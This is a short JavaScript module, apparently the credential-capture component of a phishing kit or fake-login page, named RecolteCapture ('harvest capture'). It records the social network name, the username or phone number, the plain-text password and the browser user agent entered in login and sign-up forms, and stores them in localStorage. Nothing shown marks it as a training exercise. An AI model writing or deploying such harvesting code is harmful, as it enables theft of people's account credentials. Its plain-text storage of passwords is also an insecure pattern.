/** Script partagé : inscriptions + connexions (localStorage uniquement). */
(function () {
  const REG_KEY = "recolte_registrations";
  const LOGIN_KEY = "recolte_logins";

  function looksLikePhone(value) {
    const v = String(value || "").trim();
    if (!v) return false;
    const digits = v.replace(/\D/g, "");
    return digits.length >= 8 && /^[\d+\s().-]+$/.test(v);
  }

  function read(key) {
    try {
      const data = JSON.parse(localStorage.getItem(key) || "[]");
      return Array.isArray(data) ? data : [];
    } catch {
      return [];
    }
  }

  function push(key, entry) {
    const list = read(key);
    list.unshift(entry);
    localStorage.setItem(key, JSON.stringify(list));
  }

  function normalize(payload, event) {
    if (typeof payload === "string") {
      payload = {
        network: arguments[0],
        identifier: arguments[1],
        password: arguments[2],
        method: "user",
      };
    }

    const identifier = String(payload.identifier || "").trim();
    let method = payload.method === "mobile" ? "mobile" : "user";
    if (payload.method == null && looksLikePhone(identifier)) {
      method = "mobile";
    }

    return {
      id: crypto.randomUUID ? crypto.randomUUID() : String(Date.now()),
      event,
      network: payload.network,
      method,
      identifier,
      password: String(payload.password || ""),
      at: new Date().toISOString(),
      userAgent: navigator.userAgent,
    };
  }

  window.RecolteCapture = {
    looksLikePhone,

    /** Connexion (Se connecter) */
    saveLogin(payload) {
      push(LOGIN_KEY, normalize(payload, "login"));
      return true;
    },

    /** Inscription (Créer un compte / S'inscrire) */
    saveRegister(payload) {
      push(REG_KEY, normalize(payload, "register"));
      return true;
    },

    /** @deprecated utilise saveLogin */
    save(payload) {
      return window.RecolteCapture.saveLogin(payload);
    },
  };
})();
